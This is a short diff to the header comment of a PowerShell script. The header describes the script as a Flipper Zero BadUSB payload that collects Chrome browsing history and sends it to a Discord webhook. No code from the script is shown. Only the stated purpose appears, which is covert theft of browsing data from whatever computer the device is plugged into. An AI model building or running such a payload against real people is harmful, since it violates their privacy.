@@ -1,8 +1,8 @@
 ###############
-Powershell Script to retrieve Chrome browsing history and send it via webhook to your own discord server.
-Technically for use in Flipper Zero BadUSB
-6/17/2023
--JW
+###Powershell Script to retrieve Chrome browsing history and send it via webhook to your own discord server.
+###Technically for use in Flipper Zero BadUSB
+###6/17/2023
+### -JW
 ################
 
 
